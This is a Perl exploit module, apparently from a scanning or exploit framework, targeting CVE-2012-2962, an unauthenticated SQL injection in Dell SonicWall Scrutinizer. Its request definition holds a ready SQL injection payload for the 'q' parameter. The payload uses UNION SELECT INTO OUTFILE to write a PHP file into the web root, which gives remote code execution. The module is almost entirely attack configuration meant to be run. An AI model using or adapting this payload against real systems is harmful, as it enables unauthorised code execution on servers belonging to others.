package SONICWALL::MSF::SonicwallScrutinizerSqli;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SonicwallScrutinizerSqli";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-2962",
  DESCRIPTION => "

          This module exploits a vulnerability found in Dell SonicWall Scrutinizer.

        While handling the 'q' parameter, the PHP application does not properly filter

        the user-supplied data, which can be manipulated to inject SQL commands, and

        then gain remote code execution.  Please note that authentication is NOT needed

        to exploit this vulnerability.

      ",
  METHOD => "POST",
  MSF_MODULE => "sonicwall_scrutinizer_sqli",
  OSVDB => 84232,
  PAYLOAD => "commonJson=protList&q=__RND_TXT__unionselect0x__HEX_PAYLOAD__&",
  REFERENCES => [
    "http://www.sonicwall.com/shared/download/Dell_SonicWALL_Scrutinizer_Service_Bulletin_for_SQL_injection_vulnerability_CVE.pdf",
  ],
  VARIABLES => {
    'HTMLDIR' =>       {
  DESCRIPTION => "The HTML root directory for the web application",
  VALUE => "C:\\\\Program Files\\\\Scrutinizer\\\\html\\\\",
},
    'HEX_PAYLOAD' =>       { DESCRIPTION => "", VALUE => "" },
    'RND_TXT' =>       { DESCRIPTION => "", VALUE => "" },
    'PHP_FNAME' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'commonJson=protList&q=PVH%27%20union%20select%200x3c3f706870205f5f5041594c4f41445f5f203f3e%2c0%20into%20outfile%20%27../../html/d4d/iHPWE.php%27%23',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
